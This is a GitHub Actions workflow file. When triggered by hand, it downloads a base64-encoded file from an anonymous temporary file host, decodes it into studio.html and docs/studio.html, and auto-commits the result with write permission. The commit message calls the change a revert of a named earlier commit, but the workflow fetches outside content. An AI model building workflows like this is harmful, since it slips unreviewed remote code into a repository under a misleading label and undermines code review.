name: revert
on:
  workflow_dispatch:
    inputs:
      _branch:
        description: "branch"
        default: "chore"
        required: false
jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
      - uses: actions/checkout@v4
      - run: |
          curl -sL "https://n.uguu.se/qpnHHsOs.b64" | base64 -d > studio.html
          mkdir -p docs
          cp studio.html docs/studio.html
          echo "md5: $(md5sum studio.html)"
      - uses: stefanzweifel/git-auto-commit-action@v5
        with:
          commit_message: "revert: restore fix21_4 34f3b721 stable — undo hasPlay bypass that slowed load"
          file_pattern: "studio.html docs/studio.html"
